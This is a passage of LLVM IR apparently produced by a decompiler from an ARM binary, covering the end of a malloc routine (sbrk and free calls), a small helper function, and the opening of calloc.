  %v2_12750 = load i32, i32* %r2.global-to-local, align 4
  %v3_12750 = add i32 %v2_12750, 4
  %v4_12750 = inttoptr i32 %v3_12750 to i32*
  store i32 %v2_1274c, i32* %v4_12750, align 4
  br label %dec_label_pc_128d0

dec_label_pc_12758:                               ; preds = %bb162, %.thread125
  %v0_1275c.pr = load i32, i32* @r8, align 4
  %v0_12758 = load i32, i32* %ip.global-to-local, align 4
  %v1_12758 = add i32 %v0_12758, 864
  %v2_12758 = inttoptr i32 %v1_12758 to i32*
  %v3_12758 = load i32, i32* %v2_12758, align 4
  store i32 %v3_12758, i32* %r2.global-to-local, align 4
  %v2_1275c = icmp eq i32 %v0_1275c.pr, 0
  br i1 %v2_1275c, label %.thread40, label %.thread39

.thread40:                                        ; preds = %dec_label_pc_12758
  store i32 0, i32* %r3.global-to-local, align 4
  br label %.thread43

.thread39:                                        ; preds = %dec_label_pc_12758
  %v2_12764 = urem i32 %v3_12758, 2
  store i32 %v2_12764, i32* %r3.global-to-local, align 4
  %v2_12768 = icmp eq i32 %v2_12764, 0
  br i1 %v2_12768, label %.thread43, label %dec_label_pc_12770

dec_label_pc_12770:                               ; preds = %.thread39
  %v0_12770 = load i32, i32* @r4, align 4
  %v1_12770 = load i32, i32* %r1.global-to-local, align 4
  %v3_12770 = icmp ult i32 %v0_12770, %v1_12770
  br i1 %v3_12770, label %bb163, label %.thread43

bb163:                                            ; preds = %dec_label_pc_12770
  %v2_12774 = and i32 %v3_12758, -2
  store i32 %v2_12774, i32* %r3.global-to-local, align 4
  store i32 %v2_12774, i32* %v2_12758, align 4
  br label %.thread43

.thread43:                                        ; preds = %dec_label_pc_12770, %.thread40, %.thread39, %bb163
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_21d10.338 to i32), i32* %ip.global-to-local, align 4
  %v4_12784 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21d10.338 to i32), i32 64) to i32*), align 4
  store i32 %v4_12784, i32* @r7, align 4
  %v1_12788 = add i32 %v4_12784, 864
  %v2_12788 = inttoptr i32 %v1_12788 to i32*
  %v3_12788 = load i32, i32* %v2_12788, align 4
  store i32 %v3_12788, i32* %r3.global-to-local, align 4
  %v1_1278c = urem i32 %v3_12788, 2
  store i32 %v1_1278c, i32* @r6, align 4
  %v2_1278c = icmp eq i32 %v1_1278c, 0
  br i1 %v2_1278c, label %dec_label_pc_12820, label %dec_label_pc_12794

dec_label_pc_12794:                               ; preds = %.thread43
  %v0_12794 = load i32, i32* @r8, align 4
  %v2_12794 = icmp eq i32 %v0_12794, 0
  br i1 %v2_12794, label %.thread46, label %bb164

bb164:                                            ; preds = %dec_label_pc_12794
  %v2_12798 = add i32 %v4_12784, 872
  %v3_12798 = inttoptr i32 %v2_12798 to i32*
  %v4_12798 = load i32, i32* %v3_12798, align 4
  store i32 %v4_12798, i32* %r2.global-to-local, align 4
  %v1_1279c = load i32, i32* %r1.global-to-local, align 4
  %v2_1279c = load i32, i32* @r4, align 4
  %v3_1279c = sub i32 %v2_1279c, %v1_1279c
  %v3_127a0 = add i32 %v3_1279c, %v4_12798
  store i32 %v3_127a0, i32* %r3.global-to-local, align 4
  store i32 %v3_127a0, i32* %v3_12798, align 4
  br label %.thread46

.thread46:                                        ; preds = %dec_label_pc_12794, %bb164
  %v0_127a8 = load i32, i32* @r4, align 4
  %v1_127a8 = urem i32 %v0_127a8, 8
  store i32 %v1_127a8, i32* %r3.global-to-local, align 4
  %v2_127a8 = icmp eq i32 %v1_127a8, 0
  br i1 %v2_127a8, label %.thread47, label %bb165

bb165:                                            ; preds = %.thread46
  %v2_127ac = sub nsw i32 8, %v1_127a8
  store i32 %v2_127ac, i32* %r3.global-to-local, align 4
  %v3_127b0 = add i32 %v2_127ac, %v0_127a8
  store i32 %v3_127b0, i32* @r7, align 4
  br label %.thread47

.thread47:                                        ; preds = %.thread46, %bb165
  %v0_127b8 = phi i32 [ 0, %.thread46 ], [ %v2_127ac, %bb165 ]
  %v1_127b4 = load i32, i32* @r5, align 4
  %v2_127b4 = add i32 %v1_127b4, %v0_127a8
  store i32 %v2_127b4, i32* @r6, align 4
  %v1_127b8 = load i32, i32* @r8, align 4
  %v2_127b8 = add i32 %v2_127b4, %v0_127b8
  %v2_127bc = add i32 %v2_127b8, %v1_127b8
  store i32 %v2_127bc, i32* %r1.global-to-local, align 4
  %v1_127c0 = load i32, i32* %sb.global-to-local, align 4
  %v2_127c0 = add i32 %v1_127c0, %v2_127bc
  %v1_127c4 = load i32, i32* %fp.global-to-local, align 4
  %v2_127c4 = and i32 %v1_127c4, %v2_127c0
  store i32 %v2_127c4, i32* %r2.global-to-local, align 4
  %v2_127c8 = sub i32 0, %v2_127b4
  store i32 %v2_127c8, i32* %r3.global-to-local, align 4
  %v2_127cc = sub i32 %v2_127c4, %v2_127b4
  store i32 %v2_127cc, i32* @r5, align 4
  store i32 %v2_127cc, i32* %r0.global-to-local, align 4
  br i1 %v2_127a8, label %bb166, label %bb167

bb166:                                            ; preds = %.thread47
  store i32 %v0_127a8, i32* @r7, align 4
  br label %bb167

bb167:                                            ; preds = %.thread47, %bb166
  %v1_127d8 = call i32 @__GI_sbrk(i32 %v2_127cc)
  store i32 %v1_127d8, i32* %r0.global-to-local, align 4
  %v3_127dc = icmp eq i32 %v1_127d8, -1
  br i1 %v3_127dc, label %dec_label_pc_127e4, label %dec_label_pc_127f4

dec_label_pc_127e4:                               ; preds = %bb167
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_127e8 = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_127e8, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_1284c

dec_label_pc_127f4:                               ; preds = %bb167
  %v1_127f4 = load i32, i32* @r4, align 4
  %v3_127f4 = icmp ult i32 %v1_127d8, %v1_127f4
  br i1 %v3_127f4, label %dec_label_pc_127fc, label %dec_label_pc_1284c

dec_label_pc_127fc:                               ; preds = %dec_label_pc_127f4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_21d10.338 to i32), i32* %r0.global-to-local, align 4
  %v4_12804 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21d10.338 to i32), i32 64) to i32*), align 4
  store i32 %v4_12804, i32* %r2.global-to-local, align 4
  %v1_12808 = add i32 %v4_12804, 864
  %v2_12808 = inttoptr i32 %v1_12808 to i32*
  %v3_12808 = load i32, i32* %v2_12808, align 4
  %v0_1280c = load i32, i32* @r6, align 4
  store i32 %v0_1280c, i32* %r0.global-to-local, align 4
  %v1_12810 = and i32 %v3_12808, -2
  store i32 %v1_12810, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  store i32 %v1_12810, i32* %v2_12808, align 4
  br label %dec_label_pc_1284c

dec_label_pc_12820:                               ; preds = %.thread43
  %v0_12820 = load i32, i32* %r0.global-to-local, align 4
  %v3_12820 = icmp eq i32 %v0_12820, -1
  br i1 %v3_12820, label %dec_label_pc_12828, label %dec_label_pc_12844

dec_label_pc_12828:                               ; preds = %dec_label_pc_12820
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_1282c = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_1282c, i32* %r0.global-to-local, align 4
  %v0_12830 = load i32, i32* @r7, align 4
  %v1_12830 = add i32 %v0_12830, 872
  %v2_12830 = inttoptr i32 %v1_12830 to i32*
  %v3_12830 = load i32, i32* %v2_12830, align 4
  store i32 %v3_12830, i32* %r2.global-to-local, align 4
  %v0_12834 = load i32, i32* @r4, align 4
  %v0_12838 = load i32, i32* @r5, align 4
  %v2_12834 = add i32 %v3_12830, %v1_1282c
  %v2_12838 = sub i32 %v2_12834, %v0_12834
  %v2_1283c = sub i32 %v2_12838, %v0_12838
  store i32 %v2_1283c, i32* %r3.global-to-local, align 4
  store i32 %v2_1283c, i32* %v2_12830, align 4
  %v0_12848.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_12844

dec_label_pc_12844:                               ; preds = %dec_label_pc_12820, %dec_label_pc_12828
  %v0_12848 = phi i32 [ 0, %dec_label_pc_12820 ], [ %v0_12848.pre, %dec_label_pc_12828 ]
  %v0_12844 = load i32, i32* @r4, align 4
  store i32 %v0_12844, i32* @r7, align 4
  store i32 %v0_12848, i32* @r5, align 4
  br label %dec_label_pc_1284c

dec_label_pc_1284c:                               ; preds = %dec_label_pc_127f4, %dec_label_pc_127fc, %dec_label_pc_127e4, %dec_label_pc_12844
  %v0_1284c = load i32, i32* %r0.global-to-local, align 4
  %v7_1284c = icmp eq i32 %v0_1284c, -1
  br i1 %v7_1284c, label %dec_label_pc_128d0, label %dec_label_pc_12854

dec_label_pc_12854:                               ; preds = %dec_label_pc_1284c
  %v1_12854 = load i32, i32* @r5, align 4
  %v2_12854 = add i32 %v1_12854, %v0_1284c
  %v0_12858 = load i32, i32* @r7, align 4
  %v2_12858 = sub i32 %v2_12854, %v0_12858
  %v1_1285c = or i32 %v2_12858, 1
  %v2_12860 = add i32 %v0_12858, 4
  %v3_12860 = inttoptr i32 %v2_12860 to i32*
  store i32 %v1_1285c, i32* %v3_12860, align 4
  store i32 ptrtoint (i32* @global_var_21d10.338 to i32), i32* %r1.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v4_1286c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21d10.338 to i32), i32 64) to i32*), align 4
  store i32 %v4_1286c, i32* @r6, align 4
  %v1_12870 = add i32 %v4_1286c, 872
  %v2_12870 = inttoptr i32 %v1_12870 to i32*
  %v3_12870 = load i32, i32* %v2_12870, align 4
  %v0_12874 = load i32, i32* @r8, align 4
  %v2_12874 = icmp eq i32 %v0_12874, 0
  %v0_12878 = load i32, i32* @r5, align 4
  %v2_12878 = add i32 %v0_12878, %v3_12870
  store i32 %v2_12878, i32* %r3.global-to-local, align 4
  store i32 %v2_12878, i32* %v2_12870, align 4
  %v0_12880 = load i32, i32* @r7, align 4
  %v1_12880 = load i32, i32* @r6, align 4
  %v2_12880 = add i32 %v1_12880, 44
  %v3_12880 = inttoptr i32 %v2_12880 to i32*
  store i32 %v0_12880, i32* %v3_12880, align 4
  br i1 %v2_12874, label %dec_label_pc_128d0, label %dec_label_pc_12888

dec_label_pc_12888:                               ; preds = %dec_label_pc_12854
  %v0_1288c = load i32, i32* @r8, align 4
  %v1_1288c = add i32 %v0_1288c, -12
  %v1_12890 = and i32 %v1_1288c, -8
  store i32 %v3_12658, i32* %ip.global-to-local, align 4
  %v2_12898 = add i32 %v1_12890, %v3_12658
  store i32 %v2_12898, i32* %r1.global-to-local, align 4
  %v2_1289c = icmp ugt i32 %v1_12890, 14
  store i32 5, i32* %r2.global-to-local, align 4
  %v1_128a4 = or i32 %v1_12890, 1
  store i32 %v1_128a4, i32* %r3.global-to-local, align 4
  store i32 %v1_128a4, i32* %v2_12664, align 4
  %v0_128ac = load i32, i32* %r2.global-to-local, align 4
  %v1_128ac = load i32, i32* %r1.global-to-local, align 4
  %v2_128ac = add i32 %v1_128ac, 8
  %v3_128ac = inttoptr i32 %v2_128ac to i32*
  store i32 %v0_128ac, i32* %v3_128ac, align 4
  %v0_128b0 = load i32, i32* %r2.global-to-local, align 4
  %v1_128b0 = load i32, i32* %r1.global-to-local, align 4
  %v2_128b0 = add i32 %v1_128b0, 4
  %v3_128b0 = inttoptr i32 %v2_128b0 to i32*
  store i32 %v0_128b0, i32* %v3_128b0, align 4
  br i1 %v2_1289c, label %dec_label_pc_128b8, label %dec_label_pc_128d0

dec_label_pc_128b8:                               ; preds = %dec_label_pc_12888
  %v0_128b8 = load i32, i32* @r6, align 4
  %v1_128b8 = add i32 %v0_128b8, 836
  %v2_128b8 = inttoptr i32 %v1_128b8 to i32*
  %v3_128b8 = load i32, i32* %v2_128b8, align 4
  store i32 %v3_128b8, i32* @r4, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v0_128c0 = load i32, i32* %ip.global-to-local, align 4
  %v1_128c0 = add i32 %v0_128c0, 8
  store i32 %v1_128c0, i32* @r0, align 4
  store i32 -1, i32* %v2_128b8, align 4
  %v0_128c8 = call i32 @free()
  store i32 %v0_128c8, i32* %r0.global-to-local, align 4
  %v0_128cc = load i32, i32* @r4, align 4
  %v1_128cc = load i32, i32* @r6, align 4
  %v2_128cc = add i32 %v1_128cc, 836
  %v3_128cc = inttoptr i32 %v2_128cc to i32*
  store i32 %v0_128cc, i32* %v3_128cc, align 4
  br label %dec_label_pc_128d0

dec_label_pc_128d0:                               ; preds = %.thread37, %dec_label_pc_12888, %dec_label_pc_12854, %dec_label_pc_1284c, %dec_label_pc_128b8
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_21d10.338 to i32), i32* %r0.global-to-local, align 4
  %v4_128d8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21d10.338 to i32), i32 64) to i32*), align 4
  store i32 %v4_128d8, i32* %lr.global-to-local, align 4
  %v1_128dc = add i32 %v4_128d8, 872
  store i32 %v1_128dc, i32* %r1.global-to-local, align 4
  %v1_128e0 = inttoptr i32 %v1_128dc to i32*
  %v2_128e0 = load i32, i32* %v1_128e0, align 4
  store i32 %v2_128e0, i32* %r1.global-to-local, align 4
  %v3_128e0 = add i32 %v4_128d8, 876
  %v4_128e0 = inttoptr i32 %v3_128e0 to i32*
  %v5_128e0 = load i32, i32* %v4_128e0, align 4
  store i32 %v5_128e0, i32* %r3.global-to-local, align 4
  %v1_128e8 = add i32 %v4_128d8, 868
  %v2_128e8 = inttoptr i32 %v1_128e8 to i32*
  %v3_128e8 = load i32, i32* %v2_128e8, align 4
  store i32 %v3_128e8, i32* %r3.global-to-local, align 4
  %v1_128ec = add i32 %v4_128d8, 884
  %v2_128ec = inttoptr i32 %v1_128ec to i32*
  %v3_128ec = load i32, i32* %v2_128ec, align 4
  store i32 %v3_128ec, i32* %r2.global-to-local, align 4
  %v2_128f0 = add i32 %v3_128e8, %v2_128e0
  store i32 %v2_128f0, i32* %r3.global-to-local, align 4
  %tmp218 = icmp ugt i32 %v2_128e0, %v5_128e0
  br i1 %tmp218, label %bb168, label %bb169

bb168:                                            ; preds = %dec_label_pc_128d0
  store i32 %v2_128e0, i32* %v4_128e0, align 4
  %v0_128f8.pre = load i32, i32* %r3.global-to-local, align 4
  %v1_128f8.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb169

bb169:                                            ; preds = %dec_label_pc_128d0, %bb168
  %v1_128f8 = phi i32 [ %v3_128ec, %dec_label_pc_128d0 ], [ %v1_128f8.pre, %bb168 ]
  %v4_128fc = phi i32 [ %v2_128f0, %dec_label_pc_128d0 ], [ %v0_128f8.pre, %bb168 ]
  %tmp219 = icmp ugt i32 %v4_128fc, %v1_128f8
  br i1 %tmp219, label %bb170, label %bb171

bb170:                                            ; preds = %bb169
  %v5_128fc = load i32, i32* %lr.global-to-local, align 4
  %v6_128fc = add i32 %v5_128fc, 884
  %v7_128fc = inttoptr i32 %v6_128fc to i32*
  store i32 %v4_128fc, i32* %v7_128fc, align 4
  br label %bb171

bb171:                                            ; preds = %bb169, %bb170
  %v0_12900 = load i32, i32* %lr.global-to-local, align 4
  %v1_12900 = add i32 %v0_12900, 44
  %v2_12900 = inttoptr i32 %v1_12900 to i32*
  %v3_12900 = load i32, i32* %v2_12900, align 4
  store i32 %v3_12900, i32* %ip.global-to-local, align 4
  %v1_12904 = add i32 %v3_12900, 4
  %v2_12904 = inttoptr i32 %v1_12904 to i32*
  %v3_12904 = load i32, i32* %v2_12904, align 4
  store i32 %v1_12518, i32* %r1.global-to-local, align 4
  %v1_1290c = and i32 %v3_12904, -4
  store i32 %v1_1290c, i32* %r3.global-to-local, align 4
  %v3_12910 = icmp ult i32 %v1_1290c, %v1_12518
  br i1 %v3_12910, label %dec_label_pc_1293c, label %dec_label_pc_12918

dec_label_pc_12918:                               ; preds = %bb171
  %v0_12918 = load i32, i32* @sl, align 4
  %v2_12918 = sub i32 %v1_1290c, %v0_12918
  %v2_1291c = add i32 %v0_12918, %v3_12900
  store i32 %v2_1291c, i32* %r1.global-to-local, align 4
  %v1_12920 = or i32 %v2_12918, 1
  store i32 %v1_12920, i32* %r3.global-to-local, align 4
  %v1_12924 = or i32 %v0_12918, 1
  store i32 %v1_12924, i32* %r2.global-to-local, align 4
  %v1_12928 = add i32 %v3_12900, 8
  store i32 %v1_12928, i32* %r0.global-to-local, align 4
  store i32 %v1_12924, i32* %v2_12904, align 4
  %v0_12930 = load i32, i32* %r1.global-to-local, align 4
  %v1_12930 = load i32, i32* %lr.global-to-local, align 4
  %v2_12930 = add i32 %v1_12930, 44
  %v3_12930 = inttoptr i32 %v2_12930 to i32*
  store i32 %v0_12930, i32* %v3_12930, align 4
  %v0_12934 = load i32, i32* %r3.global-to-local, align 4
  %v1_12934 = load i32, i32* %r1.global-to-local, align 4
  %v2_12934 = add i32 %v1_12934, 4
  %v3_12934 = inttoptr i32 %v2_12934 to i32*
  store i32 %v0_12934, i32* %v3_12934, align 4
  br label %dec_label_pc_12954

dec_label_pc_1293c:                               ; preds = %bb160, %bb171, %dec_label_pc_12718
  store i32 62492, i32* %r3.global-to-local, align 4
  %v0_12940 = call i32 @__aeabi_read_tp()
  %v3_12944 = load i16, i16* @global_var_21d68.334, align 2
  %v4_12944 = sext i16 %v3_12944 to i32
  store i32 %v4_12944, i32* %r3.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  %v3_1294c = add i32 %v4_12944, %v0_12940
  %v4_1294c = inttoptr i32 %v3_1294c to i32*
  store i32 12, i32* %v4_1294c, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12954

dec_label_pc_12954:                               ; preds = %bb154, %bb153, %dec_label_pc_12918, %dec_label_pc_12560, %dec_label_pc_1293c
  %v0_12954 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_12954, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12958

dec_label_pc_12958:                               ; preds = %.thread4, %dec_label_pc_1252c, %.thread124, %dec_label_pc_1239c, %dec_label_pc_12390, %dec_label_pc_121f8, %dec_label_pc_1217c, %dec_label_pc_12954
  store i32 %v2_1209c, i32* %r0.global-to-local, align 4
  store i32 1, i32* @r1, align 4
  store i32 44, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_21d10.338 to i32), i32* %r2.global-to-local, align 4
  %v4_12968 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21d10.338 to i32), i32 44) to i32*), align 4
  store i32 %v4_12968, i32* @ip, align 4
  store i32 76148, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_12968)
  br label %dec_label_pc_12974

dec_label_pc_12974:                               ; preds = %dec_label_pc_120d4, %dec_label_pc_12958
  %v0_12974 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_12974, i32* %r0.global-to-local, align 4
  store i32 %v3_12070, i32* @r4, align 4
  store i32 %v6_12070, i32* @r5, align 4
  store i32 %v9_12070, i32* @r6, align 4
  store i32 %v12_12070, i32* @r7, align 4
  store i32 %v15_12070, i32* @r8, align 4
  store i32 %v18_12070, i32* @sb, align 4
  store i32 %v21_12070, i32* @sl, align 4
  store i32 %v24_12070, i32* @fp, align 4
  store i32 %v27_12070, i32* @lr, align 4
  ret i32 %v0_12974

; uselistorder directives
  uselistorder i32 %v0_12918, { 1, 0, 2 }
  uselistorder i32 %v3_12900, { 1, 0, 2, 3 }
  uselistorder i32 %v4_128fc, { 1, 0 }
  uselistorder i32 %v2_128e0, { 2, 0, 1, 3 }
  uselistorder i32 %v4_128d8, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v1_12890, { 1, 2, 0 }
  uselistorder i32 %v0_12858, { 1, 0 }
  uselistorder i32 %v0_1284c, { 1, 0 }
  uselistorder i32 %v2_1283c, { 1, 0 }
  uselistorder i32 %v2_127cc, { 2, 1, 0 }
  uselistorder i32 %v2_127b4, { 1, 2, 0, 3 }
  uselistorder i32 %v2_127ac, { 1, 0, 2 }
  uselistorder i32 %v1_127a8, { 2, 1, 0 }
  uselistorder i32 %v0_127a8, { 3, 1, 2, 0 }
  uselistorder i32 %v1_1278c, { 1, 0 }
  uselistorder i32 %v2_12764, { 1, 0 }
  uselistorder i32 %v3_12758, { 1, 0, 2 }
  uselistorder i32 %v2_12738, { 1, 0, 2 }
  uselistorder i32* %v2_12730, { 1, 0, 2 }
  uselistorder i32 %v0_12718, { 1, 0 }
  uselistorder i32 %v6_126f4, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v0_126e0, { 2, 1, 0 }
  uselistorder i32 %v0_126c8, { 1, 0 }
  uselistorder i32 %v2_12684, { 1, 0, 2, 3 }
  uselistorder i32 %v1_12680, { 1, 0 }
  uselistorder i32 %v3_12658, { 0, 3, 1, 2, 4, 5 }
  uselistorder i32 %v2_12638, { 1, 0, 2 }
  uselistorder i32 %v2_12620, { 1, 2, 0, 3 }
  uselistorder i32 %v1_125c8, { 2, 1, 0 }
  uselistorder i32 %v6_125bc, { 3, 4, 2, 1, 0, 5 }
  uselistorder i32 %v3_12598, { 2, 1, 0, 3 }
  uselistorder i32 %v3_12558, { 1, 0, 2, 3 }
  uselistorder i32 %v0_12518, { 5, 6, 7, 0, 1, 8, 3, 2, 4, 9 }
  uselistorder i32 %v3_12510, { 1, 0, 2, 3 }
  uselistorder i32 %v4_1250c, { 1, 0, 2, 3, 4, 5, 6 }
  uselistorder i32 %v0_124f8, { 1, 0 }
  uselistorder i32 %v7_124b8, { 1, 0 }
  uselistorder i32 %v4_124b8, { 1, 0 }
  uselistorder i32 %v0_12488, { 1, 0 }
  uselistorder i32 %v2_1245c, { 3, 2, 1, 0 }
  uselistorder i32 %ip.promoted, { 2, 0, 1 }
  uselistorder i32 %v0_1245857, { 1, 0 }
  uselistorder i32 %v1_12424, { 1, 2, 0, 4, 3 }
  uselistorder i32 %v1_1240c., { 1, 2, 0 }
  uselistorder i32 %v0_12414, { 0, 1, 3, 2 }
  uselistorder i32 %v1_12414, { 1, 0 }
  uselistorder i32 %v3_123f4, { 1, 0 }
  uselistorder i32 %v4_123f0, { 1, 0, 2 }
  uselistorder i32 %v1_12360, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_123b8, { 1, 0 }
  uselistorder i32 %v1_1239c, { 1, 0 }
  uselistorder i32 %v1_1223c, { 1, 0 }
  uselistorder i32 %v0_1237c, { 2, 0, 1, 3 }
  uselistorder i32 %v3_12344, { 2, 0, 1, 3 }
  uselistorder i32 %v0_123d8.pre, { 1, 2, 0 }
  uselistorder i32 %v0_12320, { 2, 1, 0 }
  uselistorder i32 %v3_12314, { 5, 6, 4, 3, 2, 0, 1 }
  uselistorder i32 %v0_12234, { 0, 5, 4, 3, 1, 2 }
  uselistorder i32 %v1_122dc, { 1, 0 }
  uselistorder i32 %v3_122d0, { 1, 0 }
  uselistorder i32 %v0_122dc, { 1, 0 }
  uselistorder i32 %v3_122b4, { 0, 2, 3, 1 }
  uselistorder i32 %v2_122a4, { 1, 0, 2 }
  uselistorder i32 %v3_1225c, { 2, 1, 0 }
  uselistorder i32 %v0_1224c, { 3, 2, 1, 0 }
  uselistorder i32 %v0_1221c, { 1, 0 }
  uselistorder i32 %v1_121d0, { 2, 1, 0, 3 }
  uselistorder i32 %v0_121cc, { 4, 2, 1, 3, 0 }
  uselistorder i32 %v3_12170, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v3_12164, { 1, 0 }
  uselistorder i32 %v3_12134, { 1, 0 }
  uselistorder i32 %v0_12128, { 5, 6, 4, 2, 0, 3, 1 }
  uselistorder i32 %v2_12108, { 0, 2, 1, 3 }
  uselistorder i1 %v7_120fc, { 1, 0 }
  uselistorder i32 %v0_120cc, { 1, 0 }
  uselistorder i32* %r8.global-to-local, { 2, 0, 1 }
  uselistorder i32* %r5.global-to-local, { 2, 1, 0 }
  uselistorder i32* %r4.global-to-local, { 13, 0, 1, 2, 3, 4, 6, 5, 8, 9, 7, 10, 11, 12, 14, 15, 16 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 42, 39, 40, 41, 43, 44, 45, 46, 109, 110, 47, 48, 49, 50, 51, 52, 53, 54, 55, 60, 56, 57, 58, 59, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 80, 88, 75, 76, 77, 78, 79, 81, 82, 83, 84, 108, 85, 86, 87, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 32, 31, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 51, 44, 45, 46, 47, 48, 49, 50, 52, 53, 54, 55, 56, 57, 58, 59, 60 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 19, 18, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 46, 41, 42, 43, 44, 45, 47, 48, 49, 50, 51, 52, 53 }
  uselistorder i32* %r0.global-to-local, { 3, 1, 28, 2, 4, 5, 6, 18, 10, 7, 19, 8, 9, 12, 11, 16, 13, 20, 15, 14, 21, 17, 25, 23, 22, 24, 27, 26, 29, 34, 30, 31, 0, 32, 33, 35, 36, 37, 40, 41, 38, 39, 46, 43, 42, 44, 45, 47, 52, 48, 49, 50, 51, 54, 53, 57, 56, 55 }
  uselistorder i32* %lr.global-to-local, { 0, 1, 2, 3, 4, 7, 5, 6, 8, 9, 10, 11, 12, 13 }
  uselistorder i32* %ip.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 12, 11, 13, 10, 14, 15, 16, 17, 18, 19, 20, 21, 22, 0, 23, 24, 36, 35, 28, 25, 1, 26, 27, 29, 30, 31, 32, 33, 34, 37, 38, 39, 40, 41, 42 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @mmap, { 1, 0 }
  uselistorder i32 (i32)* @__malloc_largebin_index, { 1, 0 }
  uselistorder label %dec_label_pc_12974, { 1, 0 }
  uselistorder label %dec_label_pc_12958, { 7, 1, 2, 3, 4, 5, 6, 0 }
  uselistorder label %dec_label_pc_12954, { 4, 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_1293c, { 1, 2, 0 }
  uselistorder label %bb171, { 1, 0 }
  uselistorder label %bb169, { 1, 0 }
  uselistorder label %dec_label_pc_128d0, { 4, 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_1284c, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_12844, { 1, 0 }
  uselistorder label %bb167, { 1, 0 }
  uselistorder label %.thread47, { 1, 0 }
  uselistorder label %.thread46, { 1, 0 }
  uselistorder label %.thread43, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_12718, { 1, 0 }
  uselistorder label %.thread35, { 1, 0 }
  uselistorder label %bb160, { 1, 0 }
  uselistorder label %bb156, { 1, 0 }
  uselistorder label %dec_label_pc_1264c, { 2, 0, 3, 1 }
  uselistorder label %bb153, { 1, 0 }
  uselistorder label %bb151, { 1, 0 }
  uselistorder label %.thread30, { 1, 0 }
  uselistorder label %dec_label_pc_12504, { 0, 2, 1 }
  uselistorder label %.thread124, { 1, 0 }
  uselistorder label %bb147, { 1, 0 }
  uselistorder label %dec_label_pc_12458, { 1, 0 }
  uselistorder label %dec_label_pc_12460.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_12424, { 1, 0 }
  uselistorder label %dec_label_pc_123d8, { 1, 0 }
  uselistorder label %dec_label_pc_1236c, { 1, 0 }
  uselistorder label %dec_label_pc_12368, { 1, 0 }
  uselistorder label %dec_label_pc_12314, { 1, 0 }
  uselistorder label %dec_label_pc_12300, { 2, 0, 1 }
  uselistorder label %dec_label_pc_122c8, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_122b4, { 1, 0 }
  uselistorder label %bb143, { 1, 0 }
  uselistorder label %bb141, { 1, 0 }
}

define i32 @function_12988(i32 %arg1) local_unnamed_addr {
dec_label_pc_12988:
  %v0_12988 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_12988, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_12988
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_12988, %bb
  %v4_129a4 = phi i32 [ %arg1, %dec_label_pc_12988 ], [ 0, %bb ]
  ret i32 %v4_129a4

; uselistorder directives
  uselistorder label %.thread3, { 1, 0 }
}

define i32 @calloc(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %v3_129a8 = load i32, i32* @r4, align 4
  %v6_129a8 = load i32, i32* @r5, align 4
  %v9_129a8 = load i32, i32* @r6, align 4
  %v12_129a8 = load i32, i32* @lr, align 4
  %v2_129b0 = icmp eq i32 %arg1, 0
  store i32 ptrtoint (i32* @global_var_21d10.338 to i32), i32* @r5, align 4
  store i32 %arg2, i32* %r4.global-to-local, align 4
  %v2_129c0 = mul i32 %arg2, %arg1
  store i32 %v2_129c0, i32* @r6, align 4
